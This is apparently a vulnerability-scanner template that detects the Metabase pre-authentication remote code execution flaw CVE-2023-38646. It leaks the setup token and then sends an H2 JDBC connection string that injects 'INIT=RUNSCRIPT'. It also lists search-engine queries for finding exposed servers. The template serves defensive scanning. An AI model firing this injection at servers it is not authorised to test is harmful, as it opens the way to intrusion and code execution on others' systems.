http:
- extractors:
  - internal: true
    json:
    - .["setup-token"]
    name: token
    part: body_1
    type: json
  matchers:
  - condition: and
    dsl:
    - contains_any(body_2, "Syntax error in SQL statement","NoSuchFileException")
    - status_code_2 == 400
    type: dsl
  raw:
  - 'GET /api/session/properties HTTP/1.1

    Host: {{Hostname}}

    '
  - "POST /api/setup/validate HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n   \"token\":\"{{token}}\",\n   \"details\":{\n      \"details\":{\n    \
    \     \"subprotocol\":\"h2\",\n         \"classname\":\"org.h2.Driver\",\n   \
    \      \"advanced-options\":true,\n         \"subname\":\"mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT\
    \ FROM '{{file}}'//\\\\;\"\n      },\n      \"name\":\"{{randstr}}\",\n      \"\
    engine\":\"postgres\"\n   }\n}\n"
id: CVE-2023-38646
info:
  author: rootxharsh,iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:metabase:metabase:*:*:*:*:-:*:*:*
    cve-id: CVE-2023-38646
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99927
    epss-score: 0.94255
  description: 'Metabase open source before 0.46.6.1 and Metabase Enterprise before
    1.46.6.1 allow attackers to execute arbitrary commands on the server, at the server''s
    privilege level. Authentication is not required for exploitation. The other fixed
    versions are 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    fofa-query:
    - app="Metabase"
    - title="metabase"
    - app="metabase"
    google-query: intitle:"metabase"
    max-request: 2
    product: metabase
    shodan-query:
    - http.title:"Metabase"
    - http.title:"metabase"
    vendor: metabase
    verified: true
  name: Metabase < 0.46.6.1 - Remote Code Execution
  reference:
  - https://www.metabase.com/blog/security-advisory
  - https://github.com/metabase/metabase/releases/tag/v0.46.6.1
  - https://mp.weixin.qq.com/s/ATFwFl-D8k9QfQfzKjZFDg
  - https://news.ycombinator.com/item?id=36812256
  - https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
  - https://gist.github.com/testanull/a7beb2777bbf550f3cf533d2794477fe
  remediation: 'Upgrade Metabase to version 0.46.6.1 or later to mitigate this vulnerability.

    '
  severity: critical
  tags: cve2023,cve,metabase,oss,rce,vkev,vuln
variables:
  file: ./plugins/vertica.metabase-driver.jar
